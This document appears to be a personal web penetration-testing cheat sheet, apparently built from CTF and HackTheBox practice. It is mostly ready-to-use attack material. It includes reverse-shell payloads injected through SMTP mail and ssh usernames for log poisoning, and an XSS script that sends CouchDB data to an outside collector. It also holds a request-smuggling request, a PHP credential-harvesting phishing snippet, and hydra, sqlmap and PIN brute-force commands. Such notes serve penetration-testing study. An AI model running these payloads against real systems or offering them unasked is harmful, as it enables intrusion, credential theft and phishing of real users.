# Enum

* inspect url (php,asp,aspx,jsp,hta)
* inspect source (debugger,network)
* view response header
* robots.txt and sitemap.xml
* find admin console (/admin, admin.site.com)
* dir brute force
* vhost scanning
* nikto
* burpsuite
* sql injection (webmethod.md)
* xss injection (webmethod.md)
* lfi 

# Login
* default creds
* sql injection (webmethod.md)
* xss injection (webmethod.md)
* brute force
* * burp inturder (for protected paras e.g session, csrf etc)
* * using the pitchfork position to grab values (session,csrf etc) -> grep extract from html response
* * payload set -> recursive grep -> provide initial value
* * wfuzz
* type juggling

# Steps

* brute force with txt,bak,old || php,asp,aspx,jsp
* nmap -sC -sV -script=vuln -p 80  10.10.10.112 
* udp scan || tcpdump wireshhark
* check robots.txt && sitemap.xml
* nikto -h http://terratest.earth.local
* inpect page (storage, console, etc)
* GOOGLE EVERY AND ALL ERRORS AND WARNINGS
* fuzz each page with params
* Wappalyzer (get web info)
* Replace 302 with 200 and remove location
* test for IDORs
* nmap -sC -sV -p 80 --script vuln 10.10.10.56
* Check for blacklist chars (ssti, xss, ldap inj)
* unicode && double encode
* check source code
* gather emails
* shellshock check
* Send diff (HEAD,GET,POST,PUT etc)
* use default creds for the app
* modify accept header (application/json etc)
* add Headers (X-forwarded-for,X-contry)
* test host if it will call yours
* find source code (github)
* brute force dir | brute fore/bruteforce(common.txt, medium) with (-s 302,307,200,204,301,403)
* Sql injection (sql.txt) || def blind sql then
* 301 or 302 content? replace with 200
* check cert
* command injection
* prototype pollution [CS](https://blog.p6.is/Web-Security-CheatSheet/)
* snyk test (vuln packages)
* steghide -extract -sf "image"
* fuzz get n post req "ffuf -u http://10.10.10.218/api/FUZZ -w /wordlist"  "ffuf -u http://10.10.10.218/?api=FUZZ -w /wordlist/special-chars.txt"

# Brute force
* add extention according to app (Express-> js, Apache probably-> php, IIS -> asp-aspx)
`/usr/share/dirb/wordlists/big.txt` || `/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt` || `/usr/share/seclists/Discovery/Web-Content/raft-small-words.txt` || `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

* `gobuster dir -u http://lebonboncroissant.com -w /usr/share/wordlists/dirb/common.txt -x php` 
* `feroxbuster -u http://lebonboncroissant.com -w /usr/share/wordlists/dirb/common.txt -x php`
* fuzz with hostname (usually name.local)

# Search/Input fields

* `sqlmap -r req.request --dump-all --level=5 --risk=3  --batch`
* fuzz with special chars
* try nosql inj
* SSTI check
* try regex for blind cross site leak (^)
* %00, 
* SQLMAP EVERYTHING
* test for ssrf (even ports)
* test for open redirects

# LFI

* `ffuf -u http://10.10.10.112/manage.php?FUZZ=config.php -w /usr/share/wordlists/dirb/common.txt -fs 1210`
* https://github.com/D35m0nd142/LFISuite
* try rfi with revshell script
* read php with `php://filter`
* find logs to inject `payloadallthethings`  
* wordpress? 
* lfisuite fix `cp /usr/lib/python3/dist-packages/termcolor.py /usr/lib/python2.7/dist-packages`
```
root@kali:/mnt/hgfs/Share/vulnhub/symfonos1# nc -vvvv symfonos.local 25
symfonos.local [192.168.178.20] 25 (smtp) open
mail from: 0x23b
220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
250 2.1.0 Ok
rcpt to: helios
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
Subject: you got owned
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.51 443 > /tmp/f"); ?>
.
250 2.0.0 Ok: queued as E668640B8C
quit
221 2.0.0 Bye
```
* * navigate to /var/mail/<user>
* ../../var/log/auth
* ssh -o PreferredAuthentications=password -o PubkeyAuthentication=no '<?php system("nc -e /bin/sh 10.10.10.115 9001"); ?>'@10.10.10.122

# LDAP Injection

norm
```
(&
    (&
        (field=input)
        (field=input)
    )
    (|
        (field=input)
    )
)
```
fuzz (also double encode)
* `*)` || `*))` until result
* with payload all the things atributes
* blind ldap injection (ippsec CTF)
* `*)%00` || `*))%00`
```
(&
    (&
        (field=a*)
        (field=b*)
    )
)
```
inject
```
(&
    (&
        (field=a*)
        (field=b*)
        ($atribute=*)
    )
)
```

# OTP

* `stoken`

# Tomcat 

* find users => `/etc/tomcat7/tomcat-users.xml` if LFI
* exploit in learn.md

# Wordpress

* `wpscan --url http://lebonboncroissant.com -e ap --plugins-detection aggressive` (enumerate plugins)
* * (check all /wp-plugins) (check searchslpoit)
* * (check ../../../wp-config.php) if LFI 
* * (check if directory traversal is enabled)
* `wpscan --url http://lebonboncroissant.com -e u` (enumerate users)
* `wpscan --url http://lebonboncroissant.com/wp/wordpress/ --username delaunayc --wordlist /usr/share/wordlists/rockyou.txt`
* `hydra -l delaunayc -P /usr/share/wordlists/rockyou.txt http://lebonboncroissant.com http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:The password you entered for the username" -t 30`
* apperance-> theme editor->
* wp-content/themes/twentyseventeen/404.php

# JsShell
* https://github.com/shelld3v/JSshell

# XSS
* xxshunter
# Make request in request 
```
from https://github.com/arcayn/ctf-writeups/blob/main/HTB-Uni-CTF-Quals-2021/Steam-Coin.md
<script>
function jj() {
	const Http1 = new XMLHttpRequest();
	Http1.open("GET", "http://admin:youwouldntdownloadacouch@localhost:5984/users/_all_docs?include_docs=true");
	Http1.setRequestHeader('Authorization', 'Basic YWRtaW46eW91d291bGRudGRvd25sb2FkYWNvdWNo');
	Http1.send();
	
	Http1.onreadystatechange = (e) => {
		let Http2 = new XMLHttpRequest();
		Http2.open("POST", "https://enmgux1qyk0ly71.m.pipedream.net", true);
		Http2.setRequestHeader('Content-type', 'application/json');
		Http2.send(Http1.responseText);
	}
}

window.onload = jj
</script>
```

## Via svg
```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
	<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
	<script type="text/javascript">
	...
	</>
</svg>
```

# ACL Bypass 
*   `/api/test-ui` forbidden? try `/Api/test-ui` || `/API/TEST-UI`
```
POST /api/login HTTP/1.1
Host: localhost
Content-Length0aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa:
Content-Length: 787

POST /api/test-ui HTTP/1.1
Host: localhost:1337
Content-Type: application/json
Cookie: session=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9sb2NhbGhvc3Q6MTMzNy91cGxvYWRzLzc3MTNhMzM5MTFhZjZiMDJkMWE4YTQ5ODMxMjA5YWI3LnBkZiIsImtpZCI6ImYwZjAyMmNiLTUzMGMtNGI4ZC1iZmIyLWMyNTExZjMzZDcwOSJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjM2OTcwNjkzfQ.JEIPl2UC6akQDtx3u0nX2f6UygAIj8wkAwpaFZRBjUHMHXBQ2eWMmEz2pci49i7nWMHnwkjO7S_wgjlNQkqpESrY3VhU0tndLLeNu6P5BPPW2cEhVKBJp1ZQb1HoI7DaVMm3bidVK_Rc9FeUe_oieqYE7zXMLQ4WjRmz7yetvpr918gMlV-wmjT3o3xijs4Kql7PA1up6g0P8QRxw1DgV4ItX5AcPwltglEx-BOFir7e-3o4yTPg8JAslhZkTtvB5rjjuSZxal9OMB2gS8Xm31tdQXQHCX2XQyL_3ScVEiBKC6RzbjBILPznZCR6Dq1ZF8rYDDqRjSY-Es9oHC-qdA
Content-Length: 75

{"path":"/uploads/efb023c476ff09fdd61142d575d77200.svg", "keyword": "test"}
```

# php cool webshell

* `https://github.com/mIcHyAmRaNe/wso-webshell`

# Phishing with php

* get site recursively `wget -r <site>`
* append on login page and use correct params
``` // From IPPSEC Developer 26:57
<?php 
if ($SERVER['REQUEST_METHOD'] == 'POST'){
file_puts_contents("dump.txt", $_SERVER['REMOTE_ADDR'] . "." . $_POST['member_username'] . "." . $_POST['member_password']. "\n", FILE_APPEND);
}
?>
```
* start php server `sudo php -S <IP>:80`
* make form action point to `tools/creds_steal.php` and adjust params accordingly

# brute force pin 

```
import websocket
import time

def do_sockets(passwd):
    ws = websocket.WebSocket()
    ws.connect("ws://web1.utctf.live:8651/internal/ws")
    ws.send("begin")
    print(ws.recv())
    ws.send("user admin")
    ws.send("pass "+str(passwd))
    print(ws.recv())
    ws.close()


for x in range(1, 999):
    xstr = str(x)
    if len(xstr) == 1:
        temp = "00"+xstr
    elif len(xstr) == 2:
        temp = "0"+xstr
    else:
        temp = xstr
    print(temp)
    do_sockets(temp)
    time.sleep(0.2)
```

# Moodle 3.9.0

* https://0xaniket.medium.com/moodle-3-9-from-xss-to-account-takeover-to-rce-fc264e243b02